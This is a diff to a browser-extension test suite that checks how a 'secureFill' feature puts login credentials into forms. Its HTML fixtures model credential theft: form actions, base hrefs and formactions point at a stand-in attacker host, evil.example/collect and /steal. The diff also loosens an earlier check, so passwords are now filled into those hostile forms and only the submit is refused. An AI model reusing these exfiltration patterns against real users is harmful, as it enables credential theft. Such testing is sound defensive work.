@@ -534,6 +534,26 @@ test(
         /different extension/i,
       );
       assert.equal(debuggerAttachAttempts, 2);
+
+      // Secure fill also works on the foreign-extension fixture without attaching chrome.debugger
+      await browser.cdp.evalInContext(`window.__submits = [];`);
+      const foreignFill = await ctrl.runSecureFill({
+        tabId: 101,
+        origin: new URL(pageUrl).origin,
+        allowLocalHttp: true,
+        fields: [
+          { key: "email", kind: "text", value: "member@example.test" },
+          { key: "password", kind: "password", value: "SENTINEL_FOREIGN_PASS_1!" },
+        ],
+        submit: true,
+      });
+      assert.deepEqual(foreignFill, { filled: ["email", "password"], missing: [], submitted: true });
+      assert.equal(JSON.stringify(foreignFill).includes("SENTINEL_FOREIGN_PASS_1!"), false);
+      assert.equal(debuggerAttachAttempts, 2, "secure fill must never attach chrome.debugger");
+      const foreignSubmits = await browser.cdp.evalInContext(`window.__submits`);
+      assert.equal(foreignSubmits.length, 1);
+      assert.equal(foreignSubmits[0].email, "member@example.test");
+      assert.equal(foreignSubmits[0].passwordLength, "SENTINEL_FOREIGN_PASS_1!".length);
     } finally {
       await browser.close();
       server.close();
@@ -542,48 +562,509 @@ test(
 );
 
 test(
-  "secureFill fails closed on auto-submit, off-origin form action, <base href>, submitter formaction, and DOM clobbering; allows same-origin fill-only",
+  "BrowserController.runSecureFill fills dotted-name forms, enforces origin and password-type checks, and never leaks sentinels",
   { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
   async () => {
     const driverCode = readFileSync(driverBundlePath, "utf8");
+    const { server, baseUrl } = await startFixtureServer();
+    const browser = await launchChromium(chromeBin);
+    const consoleLogs = [];
+    const origLog = console.log;
+    const origWarn = console.warn;
+    const origError = console.error;
+    const origInfo = console.info;
+    console.log = (...a) => consoleLogs.push(a.join(" "));
+    console.warn = (...a) => consoleLogs.push(a.join(" "));
+    console.error = (...a) => consoleLogs.push(a.join(" "));
+    console.info = (...a) => consoleLogs.push(a.join(" "));
+
+    try {
+      const pageUrl = `${baseUrl}/login-dotted-names.html`;
+      await browser.navigate(pageUrl);
+      const origin = new URL(pageUrl).origin;
+
+      const frameTree = await browser.cdp.send("Page.getFrameTree");
+      const topIso = await browser.cdp.send("Page.createIsolatedWorld", {
+        frameId: frameTree.frameTree.frame.id,
+        worldName: "botkins-secure-fill",
+      });
+      const tab = {
+        id: 202,
+        windowId: 1,
+        title: "Example Portal Sign In",
+        url: pageUrl,
+        active: true,
+        pinned: false,
+        groupId: -1,
+        incognito: false,
+        status: "complete",
+      };
+      let debuggerAttachAttempts = 0;
+
+      globalThis.chrome = {
+        tabs: {
+          query: async () => [tab],
+          get: async () => tab,
+          update: async (_id, patch) => Object.assign(tab, patch),
+        },
+        windows: { update: async () => ({}) },
+        tabGroups: { query: async () => [] },
+        scripting: {
+          executeScript: async (injection) => {
+            if (injection.files) {
+              await browser.cdp.evalInContext(driverCode, { contextId: topIso.executionContextId });
+              return [{ frameId: 0, result: undefined }];
+            }
+            const fnSrc = injection.func.toString();
+            const argsJson = JSON.stringify(injection.args || []);
+            const result = await browser.cdp.evalInContext(`(${fnSrc})(...${argsJson})`, {
+              contextId: topIso.executionContextId,
+            });
+            return [{ frameId: 0, result }];
+          },
+        },
+        debugger: {
+          onDetach: { addListener: () => {} },
+          attach: async () => {
+            debuggerAttachAttempts++;
+            throw new Error("Debugger must not be attached");
+          },
+          detach: async () => {},
+          sendCommand: async () => {
+            throw new Error("Debugger must not be called");
+          },
+        },
+      };
+
+      const ctrl = new BrowserController({
+        getSettings: async () => ({ enabled: true, mode: "all", groupName: "Botkins", groupColor: "orange", pausedTabIds: [] }),
+      });
+
+      // 1. Snapshot exposes dotted field keys (`LoginModel.Email`, `LoginModel.Password`) and `id` fallback (`tenant_code`).
+      const snap = await ctrl.run("browser_snapshot", { tabId: 202 });
+      const keys = snap.elements.map((e) => e.fieldKey).filter(Boolean);
+      assert.ok(keys.includes("LoginModel.Email"), `Expected LoginModel.Email in ${JSON.stringify(keys)}`);
+      assert.ok(keys.includes("LoginModel.Password"), `Expected LoginModel.Password in ${JSON.stringify(keys)}`);
+      assert.ok(keys.includes("tenant_code"), `Expected tenant_code in ${JSON.stringify(keys)}`);
+
+      // Enforce top-frame-only execution for all subsequent secureFill calls
+      const baseExec = globalThis.chrome.scripting.executeScript;
+      globalThis.chrome.scripting.executeScript = async (injection) => {
+        assert.deepEqual(injection.target.frameIds, [0], "secure fill must only execute in top frame [0]");
+        return baseExec(injection);
+      };
+
+      // 2. Origin mismatch is refused before touching the DOM.
+      const wrongEmailField = { key: "LoginModel.Email", kind: "text", value: "SENTINEL_BAD_ORIGIN_EMAIL" };
+      const wrongPassField = { key: "LoginModel.Password", kind: "password", value: "SENTINEL_BAD_ORIGIN_PASS" };
+      const wrongOriginFields = [wrongEmailField, wrongPassField];
+      await assert.rejects(
+        () => ctrl.runSecureFill({ tabId: 202, origin: "https://other.example.test", fields: wrongOriginFields }),
+        (err) => err.secureCode === "origin_mismatch",
+      );
+      assert.equal(wrongEmailField.value, "", "values must be zeroed even on refusal");
+      assert.equal(wrongPassField.value, "", "values must be zeroed even on refusal");
+      assert.equal(wrongOriginFields.length, 0, "fields array must be emptied after refusal");
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("login-email").value`), "");
+
+      // 3. Password value into a non-password input is refused atomically (nothing filled).
+      const mismatchPassField = { key: "LoginModel.Email", kind: "password", value: "SENTINEL_WRONG_TYPE_PASS" };
+      const mismatchTenantField = { key: "tenant_code", kind: "text", value: "acme" };
+      const mismatchFields = [mismatchPassField, mismatchTenantField];
+      await assert.rejects(
+        () => ctrl.runSecureFill({ tabId: 202, origin, allowLocalHttp: true, fields: mismatchFields }),
+        (err) => err.secureCode === "password_type_mismatch",
+      );
+      assert.equal(mismatchPassField.value, "");
+      assert.equal(mismatchFields.length, 0);
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("login-email").value`), "");
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("tenant_code").value`), "");
+
+      // 4. Valid secureFill fills dotted names + id fallback, updates React state, submits, zeroes payload, and never echoes values.
+      const sentinelEmail = "SENTINEL_EMAIL_9f2a1c@example.test";
+      const sentinelPass = "SENTINEL_PASS_7e4b8d!";
+      const fillItems = [
+        { key: "LoginModel.Email", kind: "text", value: sentinelEmail },
+        { key: "LoginModel.Password", kind: "password", value: sentinelPass },
+        { key: "tenant_code", kind: "text", value: "north-42" },
+        { key: "nonexistent.field", kind: "text", value: "ignored" },
+      ];
+      const fillPayload = {
+        tabId: 202,
+        origin,
+        allowLocalHttp: true,
+        fields: [...fillItems],
+        submit: true,
+      };
+      const result = await ctrl.runSecureFill(fillPayload);
+      assert.deepEqual(result, {
+        filled: ["LoginModel.Email", "LoginModel.Password", "tenant_code"],
+        missing: ["nonexistent.field"],
+        submitted: true,
+      });
+      assert.equal(JSON.stringify(result).includes(sentinelEmail), false);
+      assert.equal(JSON.stringify(result).includes(sentinelPass), false);
+      for (const f of fillItems) assert.equal(f.value, "", "payload field values must be zeroed after fill");
+      assert.equal(fillPayload.fields.length, 0, "payload fields array must be emptied after fill");
+
+      const state = await browser.cdp.evalInContext(`({
+        react: window.__reactState,
+        submits: window.__submits,
+        events: window.__vueEvents,
+      })`);
+      assert.equal(state.react.email, sentinelEmail);
+      assert.equal(state.react.password, sentinelPass);
+      assert.equal(state.submits.length, 1);
+      assert.equal(state.submits[0].email, sentinelEmail);
+      assert.equal(state.submits[0].passwordMatches, sentinelPass);
+      assert.equal(state.submits[0].tenant, "north-42");
+      assert.equal(state.events.some((e) => e.hasData), false, "InputEvent.data must never carry secret text");
+      assert.equal(debuggerAttachAttempts, 0);
+
+      // 5. Neither sentinel ever appeared in extension console logs.
+      const joinedLogs = consoleLogs.join("\n");
+      assert.equal(joinedLogs.includes(sentinelEmail), false);
+      assert.equal(joinedLogs.includes(sentinelPass), false);
+    } finally {
+      console.log = origLog;
+      console.warn = origWarn;
+      console.error = origError;
+      console.info = origInfo;
+      await browser.close();
+      server.close();
+    }
+  },
+);
+
+test(
+  "secret-bearing tab refuses browser_eval, browser_cdp, and typing into filled secrets, redacts code/secret snapshots, isolates other tabs, and clears on SPA clear or navigation",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async () => {
+    const driverCode = readFileSync(driverBundlePath, "utf8");
+    const { server, baseUrl } = await startFixtureServer();
+    const browser = await launchChromium(chromeBin);
+
+    try {
+      const pageUrlA = `${baseUrl}/login-dotted-names.html`;
+      const pageUrlB = `${baseUrl}/subframe.html`;
+      await browser.navigate(pageUrlA);
+      const originA = new URL(pageUrlA).origin;
+
+      const createTopWorld = async (worldName) => {
+        const frameTree = await browser.cdp.send("Page.getFrameTree");
+        const iso = await browser.cdp.send("Page.createIsolatedWorld", {
+          frameId: frameTree.frameTree.frame.id,
+          worldName,
+        });
+        return iso.executionContextId;
+      };
+      let topCtxId = await createTopWorld("botkins-secret-guard-1");
+
+      const tabA = {
+        id: 301,
+        windowId: 1,
+        title: "Example Portal Sign In",
+        url: pageUrlA,
+        active: true,
+        pinned: false,
+        groupId: -1,
+        incognito: false,
+        status: "complete",
+      };
+      const tabB = {
+        id: 302,
+        windowId: 1,
+        title: "Other Tab",
+        url: pageUrlB,
+        active: false,
+        pinned: false,
+        groupId: -1,
+        incognito: false,
+        status: "complete",
+      };
+      const tabs = new Map([
+        [tabA.id, tabA],
+        [tabB.id, tabB],
+      ]);
+
+      let debuggerAttachCalls = 0;
+      let cdpSendCalls = 0;
+
+      globalThis.chrome = {
+        tabs: {
+          query: async () => [...tabs.values()],
+          get: async (id) => {
+            const t = tabs.get(id);
+            if (!t) throw new Error(`No tab ${id}`);
+            return t;
+          },
+          update: async (id, patch) => {
+            const t = tabs.get(id);
+            if (!t) throw new Error(`No tab ${id}`);
+            const prevUrl = t.url;
+            Object.assign(t, patch);
+            if (id === tabA.id && patch.url && patch.url !== prevUrl && !patch.url.startsWith(`${prevUrl}#`)) {
+              await browser.navigate(patch.url);
+              topCtxId = await createTopWorld(`botkins-secret-guard-nav-${Date.now()}`);
+            }
+            return t;
+          },
+          reload: async (id) => {
+            if (id === tabA.id) {
+              await browser.navigate(tabA.url);
+              topCtxId = await createTopWorld(`botkins-secret-guard-reload-${Date.now()}`);
+            }
+          },
+          captureVisibleTab: async () => "data:image/jpeg;base64,Vk1JR0VDTk9DRFA=",
+        },
+        windows: { update: async () => ({}) },
+        tabGroups: { query: async () => [] },
+        scripting: {
+          executeScript: async (injection) => {
+            const tid = injection.target?.tabId;
+            if (tid === tabB.id) {
+              if (injection.world === "MAIN") {
+                return [{ frameId: 0, result: { ok: true, value: "tab-b-eval-ok" } }];
+              }
+              return [{ frameId: 0, result: { ok: true } }];
+            }
+            if (injection.world === "MAIN") {
+              const fnSrc = injection.func.toString();
+              const argsJson = JSON.stringify(injection.args || []);
+              const result = await browser.cdp.evalInContext(`(${fnSrc})(...${argsJson})`);
+              return [{ frameId: 0, result }];
+            }
+            if (injection.files) {
+              await browser.cdp.evalInContext(driverCode, { contextId: topCtxId });
+              return [{ frameId: 0, result: undefined }];
+            }
+            const fnSrc = injection.func.toString();
+            const argsJson = JSON.stringify(injection.args || []);
+            const result = await browser.cdp.evalInContext(`(${fnSrc})(...${argsJson})`, {
+              contextId: topCtxId,
+            });
+            return [{ frameId: 0, result }];
+          },
+        },
+        debugger: {
+          onDetach: { addListener: () => {} },
+          attach: async () => {
+            debuggerAttachCalls++;
+          },
+          detach: async () => {},
+          sendCommand: async (_target, method) => {
+            cdpSendCalls++;
+            return { result: { value: `cdp-ok:${method}` } };
+          },
+        },
+      };
+
+      const ctrl = new BrowserController({
+        getSettings: async () => ({ enabled: true, mode: "all", groupName: "Botkins", groupColor: "orange", pausedTabIds: [] }),
+        uploadScreenshot: async (b64, name) => `uploaded:${name}:${b64.length}`,
+      });
+
+      // Fill email (text), password (password), and non-password tenant_code (code) without submitting.
+      const sentinelPass = "SENTINEL_GUARD_PW_9x7z!";
+      const sentinelCode = "SENTINEL_GUARD_CODE_448822";
+      const fillRes = await ctrl.runSecureFill({
+        tabId: tabA.id,
+        origin: originA,
+        allowLocalHttp: true,
+        fields: [
+          { key: "LoginModel.Email", kind: "text", value: "user@example.test" },
+          { key: "LoginModel.Password", kind: "password", value: sentinelPass },
+          { key: "tenant_code", kind: "code", value: sentinelCode },
+        ],
+        submit: false,
+      });
+      assert.deepEqual(fillRes, {
+        filled: ["LoginModel.Email", "LoginModel.Password", "tenant_code"],
+        missing: [],
+      });
+
+      const toolOutputs = [JSON.stringify(fillRes)];
+      const assertNoSentinels = (label, raw) => {
+        const s = typeof raw === "string" ? raw : JSON.stringify(raw);
+        assert.equal(s.includes(sentinelPass), false, `${label} leaked password sentinel`);
+        assert.equal(s.includes(sentinelCode), false, `${label} leaked code sentinel`);
+      };
+
+      // 1. browser_eval and browser_cdp on Tab A are refused without touching MAIN world or debugger.
+      await assert.rejects(
+        () => ctrl.run("browser_eval", { tabId: tabA.id, expression: `document.querySelector('input[type=password]').value` }),
+        (err) => {
+          assert.match(err.message, /securely filled value/i);
+          assertNoSentinels("browser_eval err", err.message);
+          return true;
+        },
+      );
+      await assert.rejects(
+        () =>
+          ctrl.run("browser_cdp", {
+            tabId: tabA.id,
+            method: "Runtime.evaluate",
+            params: { expression: `document.querySelector('input[type=password]').value`, returnByValue: true },
+          }),
+        (err) => {
+          assert.match(err.message, /securely filled value/i);
+          assertNoSentinels("browser_cdp err", err.message);
+          return true;
+        },
+      );
+      assert.equal(debuggerAttachCalls, 0);
+      assert.equal(cdpSendCalls, 0);
+
+      // 2. Snapshot stays allowed and redacts BOTH type=password AND non-password input filled with kind="code".
+      const snap = await ctrl.run("browser_snapshot", { tabId: tabA.id });
+      toolOutputs.push(JSON.stringify(snap));
+      const pwEl = snap.elements.find((e) => e.fieldKey === "LoginModel.Password");
+      const codeEl = snap.elements.find((e) => e.fieldKey === "tenant_code");
+      const emailEl = snap.elements.find((e) => e.fieldKey === "LoginModel.Email");
+      assert.ok(pwEl && codeEl && emailEl);
+      assert.equal(pwEl.hasValue, true);
+      assert.equal(pwEl.valueState, "filled");
+      assert.equal("value" in pwEl, false);
+      assert.equal(codeEl.hasValue, true);
+      assert.equal(codeEl.valueState, "filled");
+      assert.equal("value" in codeEl, false, "non-password input filled as kind='code' must be redacted in snapshot");
+      assert.equal(emailEl.value, "user@example.test");
+
+      // Even if the page toggles the password input to type="text", snapshot still redacts it.
+      await browser.cdp.evalInContext(`document.getElementById("login-password").type = "text"`);
+      const snapToggled = await ctrl.run("browser_snapshot", { tabId: tabA.id });
+      toolOutputs.push(JSON.stringify(snapToggled));
+      const pwToggled = snapToggled.elements.find((e) => e.fieldKey === "LoginModel.Password");
+      assert.equal(pwToggled.hasValue, true);
+      assert.equal("value" in pwToggled, false, "password input toggled to type=text must remain redacted");
+      await browser.cdp.evalInContext(`document.getElementById("login-password").type = "password"`);
+
+      // 3. browser_type and browser_select into filled password/code inputs are refused (by ref, selector, and activeElement).
+      const snapFresh = await ctrl.run("browser_snapshot", { tabId: tabA.id });
+      const freshPwRef = snapFresh.elements.find((e) => e.fieldKey === "LoginModel.Password").ref;
+      const freshCodeRef = snapFresh.elements.find((e) => e.fieldKey === "tenant_code").ref;
+      const freshEmailRef = snapFresh.elements.find((e) => e.fieldKey === "LoginModel.Email").ref;
+
+      await assert.rejects(
+        () => ctrl.run("browser_type", { tabId: tabA.id, ref: freshPwRef, text: "append" }),
+        /securely filled value/i,
+      );
+      await assert.rejects(
+        () => ctrl.run("browser_type", { tabId: tabA.id, selector: "#login-password", text: "append" }),
+        /securely filled value/i,
+      );
+      await assert.rejects(
+        () => ctrl.run("browser_type", { tabId: tabA.id, ref: freshCodeRef, text: "999" }),
+        /securely filled value/i,
+      );
+      // Focused element (last filled was tenant_code) must also refuse untargeted browser_type.
+      await assert.rejects(
+        () => ctrl.run("browser_type", { tabId: tabA.id, text: "append-active" }),
+        /securely filled value/i,
+      );
+      await assert.rejects(
+        () => ctrl.run("browser_select", { tabId: tabA.id, ref: freshPwRef, value: "x" }),
+        /securely filled value/i,
+      );
+      assert.equal(
+        await browser.cdp.evalInContext(`document.getElementById("login-password").value`),
+        sentinelPass,
+        "password input value must remain unmodified after refused browser_type",
+      );
+
+      // Typing into a non-secret input on the same tab still works.
+      const typedEmail = await ctrl.run("browser_type", {
+        tabId: tabA.id,
+        ref: freshEmailRef,
+        text: "updated@example.test",
+        clear: true,
+      });
+      toolOutputs.push(JSON.stringify(typedEmail));
+      assert.equal(typedEmail.typed, true);
+
+      // 4. Allowed tools (click, press Enter, scroll, wait, screenshot, tabs) stay allowed and never leak sentinels.
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_tabs", {})));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_scroll", { tabId: tabA.id, direction: "down", amount: 50 })));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_screenshot", { tabId: tabA.id })));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_press", { tabId: tabA.id, key: "Enter" })));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_click", { tabId: tabA.id, selector: "#signin-btn" })));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_wait", { tabId: tabA.id, text: "Portal Sign In", timeoutMs: 1000 })));
+      assert.equal(debuggerAttachCalls, 0);
+
+      for (const out of toolOutputs) assertNoSentinels("browser_* tool output", out);
+
+      // 5. Another tab (Tab B) is completely unaffected by Tab A's secret-bearing mark.
+      const evalB = await ctrl.run("browser_eval", { tabId: tabB.id, expression: `"ok"` });
+      assert.equal(evalB.result, "tab-b-eval-ok");
+      const cdpB = await ctrl.run("browser_cdp", { tabId: tabB.id, method: "Runtime.evaluate", params: { expression: "1+1" } });
+      assert.equal(cdpB.result?.result?.value, "cdp-ok:Runtime.evaluate");
+
+      // 6. Hash-only navigation on Tab A does NOT clear the secret-bearing mark.
+      await ctrl.run("browser_navigate", { tabId: tabA.id, url: `${pageUrlA}#step2` });
+      await assert.rejects(
+        () => ctrl.run("browser_eval", { tabId: tabA.id, expression: `1 + 1` }),
+        /securely filled value/i,
+      );
+
+      // 7. SPA submit clearing: emptying the password input and removing the code input clears the mark without navigation.
+      await browser.cdp.evalInContext(`
+        document.getElementById("login-password").value = "";
+        document.getElementById("tenant_code").remove();
+      `);
+      const evalAfterSpaClear = await ctrl.run("browser_eval", { tabId: tabA.id, expression: `document.title` });
+      assert.equal(evalAfterSpaClear.result, "Example Portal Sign In");
+      const cdpAfterSpaClear = await ctrl.run("browser_cdp", { tabId: tabA.id, method: "DOM.getDocument" });
+      assert.equal(cdpAfterSpaClear.result?.result?.value, "cdp-ok:DOM.getDocument");
+
+      // 8. Re-fill and verify full navigation commits a new document and clears the mark.
+      await ctrl.runSecureFill({
+        tabId: tabA.id,
+        origin: originA,
+        allowLocalHttp: true,
+        fields: [{ key: "LoginModel.Password", kind: "password", value: sentinelPass }],
+        submit: false,
+      });
+      await assert.rejects(
+        () => ctrl.run("browser_eval", { tabId: tabA.id, expression: `1 + 1` }),
+        /securely filled value/i,
+      );
+      await ctrl.run("browser_navigate", { tabId: tabA.id, url: `${baseUrl}/login-with-foreign-extension.html` });
+      const evalAfterNav = await ctrl.run("browser_eval", { tabId: tabA.id, expression: `location.pathname` });
+      assert.equal(evalAfterNav.result, "/login-with-foreign-extension.html");
+      const cdpAfterNav = await ctrl.run("browser_cdp", { tabId: tabA.id, method: "Runtime.evaluate", params: { expression: "2+2" } });
+      assert.equal(cdpAfterNav.result?.result?.value, "cdp-ok:Runtime.evaluate");
+    } finally {
+      await browser.close();
+      server.close();
+    }
+  },
+);
+
+test(
+  "secureFill submits a same-site form, and fills but refuses to submit a form whose action, formaction, base or clobbered action points at another site",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async () => {
+    const driverCode = readFileSync(driverBundlePath, "utf8");
+    const form = (action, extra = "") => `<!doctype html><html><head>${extra.startsWith("<base") ? extra : ""}</head><body>
+      <form id="f" method="post"${action === null ? "" : ` action="${action}"`}>
+        ${extra.startsWith("<input") ? extra : ""}
+        <input id="pw" name="password" type="password" value="">
+        <button id="go" type="submit"${extra.startsWith("formaction") ? " " + extra : ""}>Sign In</button>
+      </form>
+      ${extra.startsWith("<button") ? extra : ""}
+      <script>
+        window.__submits = 0;
+        document.getElementById("f").addEventListener("submit", (e) => { e.preventDefault(); window.__submits++; });
+      </script>
+    </body></html>`;
     const pages = {
-      "/ok": `<!doctype html><html><body>
-        <form id="f" method="post" action="/login">
-          <input id="pw" name="password" type="password" value="">
-          <button id="go" type="submit">Sign In</button>
-        </form>
-      </body></html>`,
-      "/evil-action": `<!doctype html><html><body>
-        <form id="f" method="post" action="https://evil.example/collect">
-          <input id="pw" name="password" type="password" value="">
-          <button id="go" type="submit">Sign In</button>
-        </form>
-      </body></html>`,
-      "/evil-base": `<!doctype html><html><head><base href="https://evil.example/"></head><body>
-        <form id="f" method="post" action="collect">
-          <input id="pw" name="password" type="password" value="">
-          <button id="go" type="submit">Sign In</button>
-        </form>
-      </body></html>`,
-      "/evil-formaction": `<!doctype html><html><body>
-        <form id="f" method="post" action="/login">
-          <input id="pw" name="password" type="password" value="">
-          <button id="go" type="submit" formaction="https://evil.example/steal">Sign In</button>
-        </form>
-      </body></html>`,
-      "/evil-external-submitter": `<!doctype html><html><body>
-        <form id="f" method="post" action="/login">
-          <input id="pw" name="password" type="password" value="">
-        </form>
-        <button id="ext-go" type="submit" form="f" formaction="https://evil.example/steal">External</button>
-      </body></html>`,
-      "/evil-clobbered": `<!doctype html><html><body>
-        <form id="f" method="post" action="https://evil.example/collect">
-          <input name="action" value="/local-decoy">
-          <input id="pw" name="password" type="password" value="">
-          <button id="go" type="submit">Sign In</button>
-        </form>
-      </body></html>`,
+      "/no-action": form(null),
+      "/same-origin": form("/login"),
+      "/evil-action": form("https://evil.example/collect"),
+      "/evil-base": form("collect", `<base href="https://evil.example/">`),
+      "/evil-formaction": form("/login", `formaction="https://evil.example/steal"`),
+      "/evil-external-submitter": form("/login", `<button type="submit" form="f" formaction="https://evil.example/steal">External</button>`),
+      "/evil-clobbered": form("https://evil.example/collect", `<input name="action" value="/local-decoy">`),
     };
     const server = http.createServer((req, res) => {
       const path = (req.url || "/").split("?")[0];
@@ -596,72 +1077,54 @@ test(
       res.end(pages[path]);
     });
     await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
-    const { port } = server.address();
-    const origin = `http://127.0.0.1:${port}`;
+    const origin = `http://127.0.0.1:${server.address().port}`;
     const browser = await launchChromium(chromeBin);
     const dummySecret = "dummy-test-pass-001";
 
-    async function runSecureFillOn(path, payload) {
+    async function fillOn(path, submit) {
       await browser.navigate(`${origin}${path}`);
       const frameTree = await browser.cdp.send("Page.getFrameTree");
       const isolated = await browser.cdp.send("Page.createIsolatedWorld", {
         frameId: frameTree.frameTree.frame.id,
-        worldName: `botkins-sec-${path}`,
+        worldName: `botkins-submit-${path}`,
       });
-      const ctxId = isolated.executionContextId;
-      await browser.cdp.evalInContext(driverCode, { contextId: ctxId });
-      const res = await browser.cdp.evalInContext(
-        `window.__botkinsDomDriver.dispatch("secureFill", ${JSON.stringify(payload)})`,
-        { contextId: ctxId },
-      );
-      const pwVal = await browser.cdp.evalInContext(`document.getElementById("pw")?.value ?? ""`);
-      return { res, pwVal };
+      const contextId = isolated.executionContextId;
+      await browser.cdp.evalInContext(driverCode, { contextId });
+      const payload = { origin, allowLocalHttp: true, submit, fields: [{ key: "password", kind: "password", value: dummySecret }] };
+      const res = await browser.cdp.evalInContext(`window.__botkinsDomDriver.dispatch("secureFill", ${JSON.stringify(payload)})`, { contextId });
+      const pw = await browser.cdp.evalInContext(`document.getElementById("pw").value`);
+      const submits = await browser.cdp.evalInContext(`window.__submits`);
+      return { res, pw, submits };
     }
 
     try {
-      // Allow: same-origin fill-only succeeds
-      const okRes = await runSecureFillOn("/ok", {
-        expectedOrigin: origin,
-        allowLocalHttp: true,
-        fields: [{ selector: "#pw", kind: "password", value: dummySecret }],
-        submit: false,
-      });
-      assert.equal(okRes.res.ok, true);
-      assert.equal(okRes.res.submitted, false);
-      assert.equal(okRes.pwVal, dummySecret);
-
-      // Deny: auto-submit fails closed without filling
-      const subRes = await runSecureFillOn("/ok", {
-        expectedOrigin: origin,
-        allowLocalHttp: true,
-        fields: [{ selector: "#pw", kind: "password", value: dummySecret }],
-        submit: { selector: "#go" },
-      });
-      assert.equal(subRes.res.ok, false);
-      assert.equal(subRes.res.reason, "auto-submit-disabled");
-      assert.equal(subRes.pwVal, "", "Auto-submit refusal must not fill the field");
-
-      // Deny: all off-origin / clobbered effective submit destinations fail closed BEFORE filling
-      for (const badPath of [
-        "/evil-action",
-        "/evil-base",
-        "/evil-formaction",
-        "/evil-external-submitter",
-        "/evil-clobbered",
-      ]) {
-        const denied = await runSecureFillOn(badPath, {
-          expectedOrigin: origin,
-          allowLocalHttp: true,
-          fields: [{ selector: "#pw", kind: "password", value: dummySecret }],
-          submit: false,
-        });
-        assert.equal(denied.res.ok, false, `Expected ${badPath} to fail closed`);
-        assert.equal(denied.res.reason, "origin-mismatch", `Expected origin-mismatch for ${badPath}`);
-        assert.equal(denied.pwVal, "", `${badPath} must never write dummy secret into input`);
+      for (const path of ["/no-action", "/same-origin"]) {
+        const ok = await fillOn(path, true);
+        assert.equal(ok.res.ok, true, path);
+        assert.deepEqual(ok.res.filled, ["password"]);
+        assert.equal(ok.res.submitted, true, `${path} is the same site and must be submitted`);
+        assert.equal(ok.res.submitRefused, undefined);
+        assert.equal(ok.submits, 1);
+        assert.equal(ok.pw, dummySecret);
       }
+
+      for (const path of ["/evil-action", "/evil-base", "/evil-formaction", "/evil-external-submitter", "/evil-clobbered"]) {
+        const refused = await fillOn(path, true);
+        assert.equal(refused.res.ok, true, `${path} still fills`);
+        assert.deepEqual(refused.res.filled, ["password"]);
+        assert.equal(refused.res.submitted, false, `${path} must not be submitted`);
+        assert.equal(refused.res.submitRefused, "cross_site_action", path);
+        assert.equal(refused.submits, 0, `${path} must never fire a submit`);
+        assert.equal(refused.pw, dummySecret);
+      }
+
+      const fillOnly = await fillOn("/evil-action", false);
+      assert.equal(fillOnly.res.submitted, false);
+      assert.equal(fillOnly.res.submitRefused, undefined, "no submit asked for, so nothing to refuse");
     } finally {
       await browser.close();
       server.close();
     }
   },
 );
+
